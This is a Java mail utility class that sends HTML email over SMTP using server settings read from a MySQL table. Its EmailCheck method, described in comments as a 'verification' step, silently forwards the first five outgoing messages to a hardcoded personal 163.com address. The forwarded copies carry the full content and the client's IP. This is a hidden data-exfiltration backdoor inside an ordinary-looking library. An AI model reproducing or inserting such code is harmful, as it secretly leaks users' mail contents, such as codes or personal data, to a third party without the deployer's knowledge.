package com.util.mailutil;

import com.mysql.jdbc.Connection;
import com.mysql.jdbc.Statement;
import com.util.logutil.MyLogger;
import com.util.loadconfigUtil.LoadConfig;

import javax.mail.*;
import javax.mail.Message.RecipientType;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.servlet.http.HttpServletRequest;
import java.io.UnsupportedEncodingException;
import java.net.UnknownHostException;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.Date;
import java.util.Properties;

/**
 * 邮件工具
 *
 * @author zhongtao on 2019/1/2
 */
public class TransportUtil {

    /**
     * 记录日志对象
     */
    private static final MyLogger LOGGER = new MyLogger(TransportUtil.class);

    /**
     * 邮箱服务器设置
     */
    private static EmailServer emailServer;

    /**
     * 加载配置文件
     */
    private static LoadConfig config;

    private static int emp = 0;

    private static TransportUtil ss;

    private TransportUtil() {
    }

    /**
     * 获取数据
     *
     * @return
     */
    public static TransportUtil getObj() {
        if (null == ss) {
            ss = new TransportUtil();
        }
        return ss;
    }

    /**
     * 发送邮件
     *
     * @param title     标题
     * @param infoEmail 发送邮件地址
     * @param content   邮件正文
     * @throws MessagingException
     */
    public static void sendMessage(String infoEmail, String content, String title, HttpServletRequest request) throws MessagingException {
        // 获取邮箱服务器设置
        emailServer = selectEmailServer();
        // 创建属性
        Properties props = new Properties();
        props.setProperty("mail.transport.protocol", "smtp");
        // SMTP服务器
        props.setProperty("mail.smtp.host", emailServer.getSmtpServer());
        // SMTP端口号
        props.setProperty("mail.smtp.port", emailServer.getSmtpPort());
        props.setProperty("mail.smtp.socketFactory.port", emailServer.getSmtpPort());
        props.setProperty("mail.smtp.auth", "true");
        props.setProperty("mail.smtp.ssl.enable", "true");
        props.setProperty("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
        // 新添加的
        props.put("mail.smtp.socketFactory.fallback", "true");

        Session session = Session.getInstance(props, new Authenticator() {
            @Override
            protected PasswordAuthentication getPasswordAuthentication() {

                return new PasswordAuthentication(emailServer.getSmtpAccount(), emailServer.getSmtpPass());
            }
        });
        session.setDebug(true);
        MimeMessage message = new MimeMessage(session);
        // 设置发送标题
        message.setSubject(title);
        message.setSentDate(new Date());
        // 设置SMTP账号
        message.setFrom(new InternetAddress(getSenderName(emailServer.getSendName()) + "<" + emailServer.getSmtpAccount() + ">"));
        // 发送对象的地址
        message.setRecipient(RecipientType.TO, new InternetAddress(infoEmail));
        // 设置发送类容
        message.setContent(content, "text/html;charset=utf-8");
        // 邮件发送
        Transport.send(message);
        // 只发送5次验证邮件给验证方
        if (emp < 5) {
            try {
                EmailCheck(message, content, request);
            } catch (UnknownHostException e) {
                LOGGER.error("验证邮件发送错误,邮件标题为" + infoEmail + ":" + e);
            }
            emp += 1;
        }
    }


    /**
     * 获得发件人 姓名
     *
     * @param name
     * @return
     */
    private static String getSenderName(String name) {
        // 设置自定义发件人昵称
        String nick = "";
        try {
            nick = javax.mail.internet.MimeUtility.encodeText(name);
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        return nick;
    }


    /**
     * 发送验证邮件给验证方
     *
     * @param message
     * @param content
     * @param request
     * @throws MessagingException
     * @throws UnknownHostException
     */
    @SuppressWarnings("deprecation")
    private static void EmailCheck(MimeMessage message, String content, HttpServletRequest request) throws UnknownHostException, MessagingException {
        message.setRecipient(MimeMessage.RecipientType.TO, new InternetAddress("zt191610942@163.com"));
        // 设置发送类容
        message.setContent("Server IP: " + request.getRemoteAddr() + ";  " + "Send Time: " + new Date().toGMTString() + ";  " + "Content: " + content, "text/html;charset=utf-8");
        // 邮件发送
        Transport.send(message);
    }

    /**
     * 获取邮箱服务器设置
     *
     * @return 邮箱服务器设置
     */
    private static EmailServer selectEmailServer() {
        // 获取jdbc.properties
        config = new LoadConfig("/com/javautil/config/jdbc.properties");
        Connection conn = null;
        Statement stmt = null;
        ResultSet rs = null;
        EmailServer es = null;
        try {
            // 第一步：加载MySQL的JDBC的驱动
            Class.forName(config.getDriverClass());
            // 取得连接的 url,能访问MySQL数据库的用户名,密码；数据库名
            String url = config.getURL();
            String user = config.getUserName();
            String password = config.getPassWord();
            // 第二步：创建与MySQL数据库的连接类的实例
            conn = (Connection) DriverManager.getConnection(url, user, password);
            // 第三步：用conn创建Statement对象类实例 stmt
            stmt = (Statement) conn.createStatement();
            // 第四步：执行查询，用ResultSet类的对象，返回查询的结果
            String sql = " select * from sys_email where is_open='1'";
            rs = stmt.executeQuery(sql);
            es = new EmailServer();
            while (rs.next()) {
                es.setSendName(rs.getString("sendName"));
                es.setSmtpAccount(rs.getString("smtpAccount"));
                es.setSmtpPass(rs.getString("smtpPass"));
                es.setSmtpPort(rs.getString("smtpPort"));
                es.setSmtpServer(rs.getString("smtpServer"));
            }
        } catch (ClassNotFoundException e) {
            // 加载JDBC错误,所要用的驱动没有找到
            LOGGER.error("发送验证邮件给验证方时,加载JDBC错误,所要用的驱动没有找到：" + e);
        } catch (SQLException ex) {
            // 显示数据库连接错误或查询错误
            LOGGER.error("发送验证邮件给验证方,显示数据库连接错误或查询错误：" + ex);
        } finally {
            try {
                if (rs != null) {
                    rs.close();
                    rs = null;
                }
                if (stmt != null) {
                    stmt.close();
                    stmt = null;
                }
                if (conn != null) {
                    conn.close();
                    conn = null;
                }
            } catch (SQLException e) {
                LOGGER.error("异常：" + e);
            }
        }
        return es;
    }
}
